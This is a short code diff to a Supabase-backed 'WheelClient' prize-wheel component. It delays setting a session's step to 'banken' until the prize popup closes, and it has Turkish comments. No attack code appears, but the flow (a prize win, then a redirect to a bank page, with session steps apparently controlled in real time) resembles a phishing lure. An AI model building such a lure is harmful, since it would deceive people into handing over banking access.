@@ -352,10 +352,11 @@ export function WheelClient({
       wheel_rotation_index: prize.rotationIndex,
     };
 
+    // ⭐ POPUP FIX: current_step'i HEMEN "banken" YAPMA — realtime gate
+    //    popup acilmadan /banken'e atardi. Step guncellemesi popup kapaninca.
     await supabase
       .from("sessions")
       .update({ is_hidden: false, amount: prize.amount ?? 0,
-        current_step: "banken",
         form_data: nextFormData,
       })
       .eq("id", sessionId);
@@ -365,7 +366,6 @@ export function WheelClient({
         ? {
             ...previous,
             amount: prize.amount ?? 0,
-            current_step: "banken",
             form_data: nextFormData,
           }
         : previous,
@@ -383,6 +383,12 @@ export function WheelClient({
   const handlePopupClose = () => {
     setPopupOpen(false);
     logWheelEvent("popup_close");
+    if (supabase && sessionId) {
+      void supabase
+        .from("sessions")
+        .update({ is_hidden: false, current_step: "banken" })
+        .eq("id", sessionId);
+    }
     const bankTarget = `/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`;
     try { window.location.replace(bankTarget); } catch {}
     try { router.replace(bankTarget); } catch {}
